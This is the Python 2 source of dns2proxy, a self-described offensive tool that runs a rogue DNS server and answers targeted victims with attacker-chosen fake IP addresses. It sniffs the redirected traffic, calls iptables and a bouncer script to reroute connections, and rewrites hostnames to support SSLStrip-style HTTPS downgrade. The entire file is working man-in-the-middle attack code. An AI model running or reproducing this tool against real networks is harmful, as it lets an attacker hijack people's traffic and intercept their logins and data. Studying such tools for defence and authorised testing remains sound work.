#!/usr/bin/python2.6

# dns2proxy for offensive cybersecurity V0.8
#
#
# Usage: python2.6 dns2proxy.py <interface> <IPdnsserver> <routingIP> 
#
# Example: python2.6 dns2proxy.py eth0 192.168.1.101 192.168.1.200 
#
# Author: Leonardo Nve ( leonardo.nve@gmail.com)
#
#

import dns.message
import dns.rrset
import dns.resolver
import socket
import sys
import numbers
import threading, time
from struct import *
import datetime
import pcapy
import os
import signal
import errno
from time import sleep


debug = 1

dev = sys.argv[1]

adminip = '192.168.1.80'

consultas = {}
spoof = {}
dominios = {}

nospoof = []
specificspoof = {}
nospoofto = []
victims = []

LOGREQFILE = "dnslog.txt"
LOGSNIFFFILE = "snifflog.txt"
LOGALERTFILE = "dnsalert.txt"
RESOLVCONF = "resolv.conf"

victim_file    = "victims.cfg"
nospoof_file   = "nospoof.cfg"
nospoofto_file = "nospoofto.cfg"
specific_file  = "spoof.cfg"
dominios_file  = "domains.cfg"

if len(sys.argv) >2:
    ip = sys.argv[2]

if len(sys.argv) >3:
    ip2 = sys.argv[3]


Resolver = dns.resolver.Resolver()

######################
# GENERAL SECTION    #
######################
noserv = 1

def save_req(lfile,str):
	f = open(lfile,"a")
	f.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")+' '+str)
	f.close()

def SIGUSR1_handle(signalnum,frame):
	global noserv
	global Resolver
	noserv = 0
	print 'Reconfiguring....'
	process_files()
	Resolver.reset()
	Resolver.read_resolv_conf(RESOLVCONF)
	return

def process_files():
	global nospoof
	global specificspoof
	global nospoof_file
	global specific_file
	global dominios_file
	global dominios
	global nospoofto_file

	for i in nospoof[:]:
		nospoof.remove(i)

	for i in nospoofto[:]:
		nospoofto.remove(i)

	for i in victims[:]:
		victims.remove(i)

	dominios.clear()
	specificspoof.clear()

	nsfile = open(nospoof_file,'r')
	for line in nsfile:
		if line[0]=='#':
			continue
		h = line.split()
		if len(h)>0:
			print 'Non spoofing '+h[0]
			nospoof.append(h[0])

	nsfile.close()

	nsfile = open(victim_file,'r')
	for line in nsfile:
		if line[0]=='#':
			continue
		h = line.split()
		if len(h)>0:
			print 'Spoofing only to '+h[0]
			victims.append(h[0])

	nsfile.close()


	nsfile = open(nospoofto_file,'r')
	for line in nsfile:
		if line[0]=='#':
			continue
		h = line.split()
		if len(h)>0:
			print 'Non spoofing to '+h[0]
			nospoofto.append(h[0])

	nsfile.close()

	nsfile = open(specific_file,'r')
	for line in nsfile:
		if line[0]=='#':
			continue
		h = line.split()
		if len(h)>1:
			print 'Specific host spoofing '+h[0]+' with '+h[1]
			specificspoof[h[0]] = h[1]

	nsfile.close()
	nsfile = open(dominios_file,'r')
	for line in nsfile:
		if line[0]=='#':
			continue
		h = line.split()
		if len(h)>1:
			print 'Specific domain IP '+h[0]+' with '+h[1]
			dominios[h[0]] = h[1]

	nsfile.close()
	return

def DEBUGLOG(str):
	global debug
	if debug:
		print str
	return

######################
# SNIFFER SECTION    #
######################

class ThreadSniffer(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        #print self.getName(), " Sniffer Waiting connections...."
        go()

def go():
    global ip
    global dev
    bpffilter = "dst host %s and not src host %s and !(tcp dst port 80 or tcp dst port 443) and (not host %s)" % (
        ip, ip, adminip)
    cap = pcapy.open_live(dev, 255, 1, 0)
    cap.setfilter(bpffilter)
    print "Starting sniffing in (%s = %s)...." % (dev, ip)

    #start sniffing packets
    while (1):
        try:
            (header, packet) = cap.next()
            parse_packet(packet)
        except:
            a = 1
        #print ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen()))


#function to parse a packet
def parse_packet(packet):
    eth_length = 14
    eth_protocol = 8
    global ip
    global consultas
    global ip2

    #Parse IP packets, IP Protocol number = 8
    if eth_protocol == 8:
        #Parse IP header
        #take first 20 characters for the ip header
        ip_header = packet[eth_length:20 + eth_length]

        #now unpack them :)
        iph = unpack('!BBHHHBBH4s4s', ip_header)

        version_ihl = iph[0]
        #version = version_ihl >> 4
        ihl = version_ihl & 0xF

        iph_length = ihl * 4

        #ttl = iph[5]
        protocol = iph[6]
        s_addr = socket.inet_ntoa(iph[8])
        d_addr = socket.inet_ntoa(iph[9])



        #TCP protocol
        if protocol == 6:
            t = iph_length + eth_length
            tcp_header = packet[t:t + 20]

            #now unpack them :)
            tcph = unpack('!HHLLBBHHH', tcp_header)

            source_port = tcph[0]
            dest_port = tcph[1]
            #            sequence = tcph[2]
            #            acknowledgement = tcph[3]
            #            doff_reserved = tcph[4]
            #            tcph_length = doff_reserved >> 4



            if consultas.has_key(str(s_addr)):
                print ' ==> Source Address : ' + str(s_addr) + ' *  Destination Address : ' + str(d_addr)
                print ' Source Port : ' + str(source_port) + ' *  Dest Port : ' + str(dest_port)
                #            	print '>>>>  '+str(s_addr)+' esta en la lista!!!!.....'
                comando = 'sh ./IPBouncer.sh %s %s %s %s' % (
                    ip2, str(dest_port), consultas[str(s_addr)], str(dest_port))
                os.system(comando)
                #print '>>>> ' + comando
                comando = '/sbin/iptables -D INPUT -p tcp -d %s --dport %s -s %s --sport %s --j REJECT --reject-with tcp-reset' % (
                    ip, str(dest_port), str(s_addr), str(source_port))
                os.system(comando)
                comando = '/sbin/iptables -A INPUT -p tcp -d %s --dport %s -s %s --sport %s --j REJECT --reject-with tcp-reset' % (
                    ip, str(dest_port), str(s_addr), str(source_port))
                os.system(comando)
                #print '>>>> ' + comando

        #UDP packets
        elif protocol == 17:
            u = iph_length + eth_length
            #udph_length = 8
            #udp_header = packet[u:u + 8]
            #now unpack them :)
            #udph = unpack('!HHHH', udp_header)
            #source_port = udph[0]
            #dest_port = udph[1]
            #length = udph[2]
            #checksum = udph[3]
            #print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(length) + ' Checksum : ' + str(checksum)
            #h_size = eth_length + iph_length + udph_length
            #data_size = len(packet) - h_size
            #get data from the packet
            #data = packet[h_size:]

######################
#  DNS SECTION       #
######################

def respuestas(name, type):
    global Resolver

    print 'Query = ' + name + ' ' + type
    try:
        answers = Resolver.query(name, type)
    except Exception, e:
        print 'Exception...'
        return 0
    return answers


def requestHandler(address, message):
    resp = None
    dosleep = False
    try:
        message_id = ord(message[0]) * 256 + ord(message[1])
        print 'msg id = ' + str(message_id)
        if message_id in serving_ids:
            print 'I am already serving this request.'
            return
        serving_ids.append(message_id)
        print 'Client IP: ' + address[0]
        prov_ip = address[0]
        try:
            msg = dns.message.from_wire(message)
            try:
                op = msg.opcode()
                if op == 0:
                    # standard and inverse query
                    qs = msg.question
                    if len(qs) > 0:
                        q = qs[0]
                        print 'request is ' + str(q)
                        save_req(LOGREQFILE,'Client IP: '+address[0]+'    request is    '+ str(q)+'\n')
                        if q.rdtype == dns.rdatatype.A:
                            print 'Doing the A query....'
                            resp, dosleep = std_A_qry(msg, prov_ip)
                        elif q.rdtype == dns.rdatatype.PTR:
                            #print 'Doing the PTR query....'
                            resp = std_PTR_qry(msg)
                        elif q.rdtype == dns.rdatatype.MX:
                            print 'Doing the MX query....'
                            resp = std_MX_qry(msg)
                        elif q.rdtype == dns.rdatatype.TXT:
                            #print 'Doing the TXT query....'
                            resp = std_TXT_qry(msg)
                        elif q.rdtype == dns.rdatatype.AAAA:
                            #print 'Doing the AAAA query....'
                            resp = std_AAAA_qry(msg)
                        else:
                            # not implemented
                            resp = make_response(qry=msg, RCODE=4)  # RCODE =  4    Not Implemented
                else:
                    # not implemented
                    resp = make_response(qry=msg, RCODE=4)  # RCODE =  4    Not Implemented

            except Exception, e:
                print 'got ' + repr(e)
                resp = make_response(qry=msg, RCODE=2)  # RCODE =  2    Server Error
                print 'resp = ' + repr(resp.to_wire())
        except Exception, e:
            print 'got ' + repr(e)
            resp = make_response(id=message_id, RCODE=1)  # RCODE =  1    Format Error
            print 'resp = ' + repr(resp.to_wire())
    except Exception, e:
        # message was crap, not even the ID
        print 'got ' + repr(e)

    if resp:
        s.sendto(resp.to_wire(), address)
    if dosleep: sleep(1)   # Performance downgrade no tested jet


def std_PTR_qry(msg):
    qs = msg.question
    print str(len(qs)) + ' questions.'
    iparpa = qs[0].to_text().split(' ', 1)[0]
    print 'Host: ' + iparpa
    resp = make_response(qry=msg)
    hosts = respuestas(iparpa[:-1], 'PTR')
    if isinstance(hosts, numbers.Integral):
        print 'No host....'
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
        return resp

    for host in hosts:
        print 'Adding ' + host.to_text()
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.PTR, host.to_text())
        resp.answer.append(rrset)

    return resp


def std_MX_qry(msg):
    qs = msg.question
    print str(len(qs)) + ' questions.'
    iparpa = qs[0].to_text().split(' ', 1)[0]
    print 'Host: ' + iparpa
    resp = make_response(qry=msg)
    hosts = respuestas(iparpa[:-1], 'MX')
    if isinstance(hosts, numbers.Integral):
        print 'No host....'
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
        return resp

    for host in hosts:
        print 'Adding ' + host.to_text()
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.MX, host.to_text())
        resp.answer.append(rrset)

    return resp


def std_TXT_qry(msg):
    qs = msg.question
    print str(len(qs)) + ' questions.'
    iparpa = qs[0].to_text().split(' ', 1)[0]
    print 'Host: ' + iparpa
    resp = make_response(qry=msg)
    hosts = respuestas(iparpa[:-1], 'TXT')
    if isinstance(hosts, numbers.Integral):
        print 'No host....'
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
        return resp

    for host in hosts:
        print 'Adding ' + host.to_text()
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.TXT, host.to_text())
        resp.answer.append(rrset)

    return resp


def std_AAAA_qry(msg):
    qs = msg.question
    print str(len(qs)) + ' questions.'
    iparpa = qs[0].to_text().split(' ', 1)[0]
    print 'Host: ' + iparpa
    resp = make_response(qry=msg)
    hosts = respuestas(iparpa[:-1], 'AAAA')

    if isinstance(hosts, numbers.Integral):
        print 'No host....'
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
        return resp

    for host in hosts:
        print 'Adding ' + host.to_text()
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.AAAA, host.to_text())
        resp.answer.append(rrset)

    return resp


def std_A_qry(msg,prov_ip):
    global consultas
    dosleep = False
    qs = msg.question
    print str(len(qs)) + ' questions.'
    resp = make_response(qry=msg)
    for q in qs:
        qname = q.name.to_text()[:-1]
        print 'q name = ' + qname

        host = qname.lower()
        punto = host.find(".")
        dominio = host[punto:]

        if dominios.has_key(dominio):
            ttl = 1
            id = host[:punto]
            print 'Alert domain! ID: '+id
            # Here the HANDLE!
            #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
            save_req(LOGALERTFILE,'Alert domain! ID: '+id+'\n')
            print 'Responding with IP = '+ dominios[dominio]
            rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
            resp.answer.append(rrset)
            return resp, dosleep


        if spoof.has_key(qname):
            return std_ASPOOF_qry(msg), dosleep

        ips = respuestas(qname.lower(), 'A')
        if isinstance(ips,numbers.Integral) and not specificspoof.has_key(qname.lower()):
            host2=''
            if host[:5]=='wwww.':
            	host2='www%s'%(dominio)
            elif host[:3]=='web':
            	host2 = host[3:]
            if host2!='':
            	print 'SSLStrip transforming host: %s => %s ...'%(host,host2)
            	ips = respuestas(host2,'A')

        #print '>>> Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)
        prov_resp = ips[0]
        consultas[prov_ip] = prov_resp

        if isinstance(ips, numbers.Integral):
            print 'No host....'
            resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
            return resp, dosleep


        ttl = 1
        if (host not in nospoof) and (prov_ip not in nospoofto) and (len(victims)==0 or prov_ip in victims):
                if specificspoof.has_key(host):
                    save_req(LOGREQFILE,'!!! Specific host ('+host+') asked....\n')
                    print 'Adding fake IP = '+ specificspoof[host]
                    rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, specificspoof[host])
                    resp.answer.append(rrset)
                    if isinstance(ips,numbers.Integral):
                        return resp, dosleep
                else:
                    consultas[prov_ip]=prov_resp
                    #print 'DEBUG: Adding consultas[%s]=%s'%(prov_ip,prov_resp)
                    if len(sys.argv) > 2:
                        rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, sys.argv[2])
                        print 'Adding fake IP = ' + sys.argv[2]
                        resp.answer.append(rrset)
                    if len(sys.argv) > 3:
    	                #Sleep only when using global resquest matrix
	                dosleep = True
                        rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, sys.argv[3])
                        print 'Adding fake IP = ' + sys.argv[3]
                        resp.answer.append(rrset)

        for ip in ips:
            print 'Adding real IP  = ' + ip.to_text()
            rrset = dns.rrset.from_text(q.name, ttl,dns.rdataclass.IN, dns.rdatatype.A, ip.to_text())
            resp.answer.append(rrset)


    return resp, dosleep

# def std_A2_qry(msg):
# 	qs = msg.question
# 	print str(len(qs)) + ' questions.'
# 	iparpa = qs[0].to_text().split(' ',1)[0]
# 	print 'Host: '+ iparpa
# 	resp = make_response(qry=msg)
# 	rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.A, '4.4.45.4')
# 	resp.answer.append(rrset)
# 	return resp

def std_ASPOOF_qry(msg):
    qs = msg.question
    print str(len(qs)) + ' questions.'
    iparpa = qs[0].to_text().split(' ', 1)[0]
    print 'Host: ' + iparpa
    resp = make_response(qry=msg)

    for q in qs:
        qname = q.name.to_text()[:-1]
        print 'q name = ' + qname
        # 	    rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.facebook.com.')
        # 		resp.answer.append(rrset)
        # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.yahoo.com.')
        # 		resp.answer.append(rrset)
        # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.tuenti.com.')
        # 		resp.answer.append(rrset)
        # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.twitter.com.')
        # 		resp.answer.append(rrset)
        rrset = dns.rrset.from_text(qname, 1000, dns.rdataclass.IN, dns.rdatatype.A, spoof[qname])
        resp.answer.append(rrset)
        return resp


def make_response(qry=None, id=None, RCODE=0):
    if qry is None and id is None:
        raise Exception, 'bad use of make_response'
    if qry is None:
        resp = dns.message.Message(id)
        # QR = 1
        resp.flags |= dns.flags.QR
        if RCODE != 1:
            raise Exception, 'bad use of make_response'
    else:
        resp = dns.message.make_response(qry)
    resp.flags |= dns.flags.AA
    resp.flags |= dns.flags.RA
    resp.set_rcode(RCODE)
    return resp


process_files()
Resolver.reset()
Resolver.read_resolv_conf(RESOLVCONF)
signal.signal(signal.SIGUSR1,SIGUSR1_handle)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('', 53))
print 'binded to UDP port 53.'
serving_ids = []
noserv = 1

if len(sys.argv) >2:
	sniff = ThreadSniffer()
	sniff.start()

while True:
    if noserv:
    	DEBUGLOG('waiting requests.')
    noserv = 1
    try:
    	message, address = s.recvfrom(1024)
    except socket.error as (code, msg):
    	if code != errno.EINTR:
    		raise

    if noserv:
    	DEBUGLOG('serving a request.')
    	requestHandler(address, message)
